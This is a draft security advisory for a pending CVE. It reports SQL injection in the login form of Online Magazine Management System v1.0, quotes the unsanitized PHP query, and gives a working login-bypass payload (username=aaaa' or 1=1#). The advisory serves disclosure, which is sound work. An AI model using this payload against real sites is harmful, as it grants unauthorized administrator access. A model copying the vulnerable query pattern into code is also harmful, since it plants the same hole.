---
draft: yes
cve: "pending..."
slug: "pending: SQL Injection in Online Magazine Management System"
title: "SQL Injection in Online Magazine Management System"
images: [/images/cve-mitre.png]
date: 2022-10-10
tags:
- cve
- sql injection
- sqli
---
Login form of Online Magazine Management System v1.0 is prone to SQL injection. An attacker could exploit parameters `username` and `password` to get administrator access.
<!--more-->

- mitre: https://cve.mitre.org/

<hr />

**Description:**  
The parameters `username` and `password` are not sanitized during the login process.  
An attacker could craft a payload to bypass the login form.
No valid login or password are needed.  
The first user in the database will be returned, so usually the `admin` user.

**Details:**  
File: `/classes/Login.php`, function: `login()`, line 21:  
```
$qry = $this->conn->query("SELECT * from users where username = '$username' and password = md5('$password')");
```

**Payload:**  
```
POST /classes/Login.php?f=login
username=aaaa' or 1=1#&password=whatever
```

**PoC:**  
![cve-2022-9999](/images/cve-2022-9999.png)
